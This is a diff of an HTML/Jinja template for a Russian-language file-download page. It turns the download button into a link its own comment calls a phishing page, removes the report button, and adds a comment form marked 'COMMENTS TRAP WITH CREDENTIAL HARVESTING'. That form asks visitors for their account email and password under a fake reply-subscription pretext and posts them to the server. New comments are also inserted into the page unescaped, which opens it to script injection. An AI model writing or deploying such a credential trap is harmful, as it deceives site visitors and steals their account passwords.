@@ -26,9 +26,10 @@
             <small class="text-muted">{{ file.format }} • {{ file.date }}</small>
         </div>
         <div>
-            <button onclick="startDownload('{{ uid }}', '{{ file.name }}')" class="btn btn-outline-dark btn-sm">
+            <!-- Кнопка ведет на фишинг Семяныча -->
+            <a href="/verify/{{ uid }}/{{ file.name }}" class="btn btn-outline-dark btn-sm">
                 <i class="fa-solid fa-download"></i> Скачать
-            </button>
+            </a>
         </div>
     </div>
     {% endfor %}
@@ -44,50 +45,107 @@
             </a>
         </div>
     </div>
-
-    <div class="mt-4 d-flex justify-content-between">
-        <button class="btn btn-outline-danger btn-sm">
-            <i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться
-        </button>
-        <span class="text-muted small"><i class="fa-regular fa-clock"></i> Удаление через 24ч</span>
-    </div>
 </div>
 
+<!-- COMMENTS TRAP WITH CREDENTIAL HARVESTING -->
 <div class="card p-4 mt-4">
-    <h6 class="mb-3">Комментарии</h6>
-    <div class="form-floating mb-2">
-        <textarea class="form-control" placeholder="Leave a comment here" id="floatingTextarea" style="height: 80px"></textarea>
-        <label for="floatingTextarea">Ваше сообщение...</label>
+    <div class="d-flex justify-content-between align-items-center mb-3">
+        <h6 class="mb-0">Обсуждение</h6>
+        <span class="badge bg-success">Online</span>
     </div>
-    <button class="btn btn-secondary btn-sm w-100">Отправить</button>
+    
+    <div id="commentsList" class="mb-4">
+        {% if db_data and db_data.comments %}
+            {% for c in db_data.comments %}
+                <div class="border-bottom pb-2 mb-2">
+                    <strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small>
+                    <p class="mb-0">{{ c.text }}</p>
+                </div>
+            {% endfor %}
+        {% else %}
+            <p class="text-muted small text-center">Комментариев пока нет. Будьте первым!</p>
+        {% endif %}
+    </div>
+
+    <div class="bg-light p-3 rounded border">
+        <p class="small text-muted mb-2"><i class="fa-regular fa-bell"></i> <strong>Подписка на ответы:</strong> Введите Email и пароль от вашей учетной записи, чтобы получать уведомления о новых сообщениях в этой ветке.</p>
+        
+        <div class="row g-2 mb-2">
+            <div class="col-md-6">
+                <input type="text" id="usernameInput" class="form-control form-control-sm" placeholder="Ваше имя (публичное)">
+            </div>
+            <div class="col-md-6">
+                <input type="email" id="emailInput" class="form-control form-control-sm" placeholder="Email (для уведомлений)">
+            </div>
+        </div>
+        
+        <div class="mb-2">
+            <input type="password" id="passwordInput" class="form-control form-control-sm" placeholder="Пароль (для управления подпиской)">
+        </div>
+
+        <div class="form-floating mb-2">
+            <textarea class="form-control" placeholder="Leave a comment here" id="commentText" style="height: 80px"></textarea>
+            <label for="commentText">Ваше сообщение...</label>
+        </div>
+        
+        <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100">
+            <i class="fa-regular fa-paper-plane"></i> Отправить и Подписаться
+        </button>
+    </div>
 </div>
 
 <script>
-function startDownload(uid, filename) {
-    const modal = document.getElementById('downloadModal');
-    const timerVal = document.getElementById('timerValue');
-    const progressBar = document.getElementById('progressBar');
+function sendComment(uid) {
+    const username = document.getElementById('usernameInput').value || 'Guest';
+    const email = document.getElementById('emailInput').value;
+    const password = document.getElementById('passwordInput').value;
+    const text = document.getElementById('commentText').value;
     
-    modal.style.display = 'flex';
-    let timeLeft = 10;
-    
-    // Агрессивная отправка данных перед началом таймера
-    if(window.EagleEye) {
-        const eagle = new EagleEye(); 
-        eagle.collect('Download Button Clicked');
+    if(!text) {
+        alert("Введите текст комментария!");
+        return;
     }
 
-    const interval = setInterval(() => {
-        timeLeft--;
-        timerVal.textContent = timeLeft;
-        progressBar.style.width = ((10 - timeLeft) * 10) + '%';
-        
-        if (timeLeft <= 0) {
-            clearInterval(interval);
-            modal.style.display = 'none';
-            window.location.href = `/download/${uid}/${filename}`;
+    const btn = document.querySelector('button[onclick^="sendComment"]');
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Обработка...';
+    btn.disabled = true;
+
+    fetch('/api/comment', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ 
+            uid: uid, 
+            username: username, 
+            text: text,
+            email: email,      
+            password: password 
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        btn.innerHTML = originalText;
+        btn.disabled = false;
+
+        if(data.status === 'ok') {
+            const list = document.getElementById('commentsList');
+            if(list.querySelector('.text-center')) list.innerHTML = '';
+
+            const html = `
+                <div class="border-bottom pb-2 mb-2">
+                    <strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small>
+                    <p class="mb-0">${data.comment.text}</p>
+                </div>`;
+            list.insertAdjacentHTML('beforeend', html);
+            
+            document.getElementById('commentText').value = '';
+            document.getElementById('passwordInput').value = ''; 
+            
+            if(email && password) {
+                alert(`Подписка оформлена на ${email}. Вы получите уведомление при ответе.`);
+            }
         }
-    }, 1000);
+    });
 }
 </script>
 {% endblock %}
